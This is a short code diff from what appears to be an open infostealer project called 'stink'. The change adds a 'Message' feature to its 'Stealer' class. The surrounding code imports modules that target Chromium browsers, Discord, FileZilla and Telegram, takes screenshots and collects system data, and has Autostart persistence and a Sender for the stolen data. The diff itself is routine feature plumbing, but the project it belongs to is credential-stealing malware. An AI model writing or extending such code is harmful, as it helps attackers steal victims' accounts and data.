@@ -6,7 +6,7 @@ from multiprocessing import Pool
 
 from stink.helpers import functions
 from stink.enums import Features, Utils
-from stink.utils import Autostart, Sender
+from stink.utils import Autostart, Sender, Message
 from stink.helpers.config import MultistealerConfig
 from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
 
@@ -20,6 +20,7 @@ class Stealer(Thread):
         self.user_id = user_id
         self.errors = True if Utils.errors in utils else False
         self.autostart = True if Utils.autostart in utils else False
+        self.message = True if Utils.message in utils else False
 
         self.config = MultistealerConfig()
 
@@ -164,6 +165,9 @@ class Stealer(Thread):
 
             if self.autostart is True:
                 Autostart(argv[0], self.errors).run()
+
+            if self.message is True:
+                Message(self.errors).run()
 
         except Exception as e:
             if self.errors is True: print(f"[Multistealer]: {repr(e)}")
